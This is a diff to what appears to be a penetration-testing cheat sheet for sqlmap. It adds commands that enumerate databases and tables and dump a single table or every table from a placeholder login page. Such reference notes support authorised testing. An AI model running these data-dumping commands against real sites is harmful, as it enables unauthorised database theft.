@@ -17,6 +17,18 @@ sqlmap.py -u "http://testsite.com/login.php?param1=ciao&param2=it" -p param1
 # Simple Scan on a POST parameter
 sqlmap.py -u "http://testsite.com/login.php" --data="param1=ciao&param2=it" -p param1
 
+# Get the list of DBs
+sqlmap.py -u "http://testsite.com/login.php" --dbs
+
+# Get the list of tables with a DB
+sqlmap.py -u "http://testsite.com/login.php" -D <db-name> --tables
+
+# Dump a table
+sqlmap.py -u "http://testsite.com/login.php" -D <db-name> -T <table-name> --dump
+
+# Dump everything
+sqlmap.py -u "http://testsite.com/login.php" --dump-all
+
 # Simple Scan  (--batch does not let user reply to questions)
 sqlmap.py -u "http://testsite.com/login.php" --batch
 
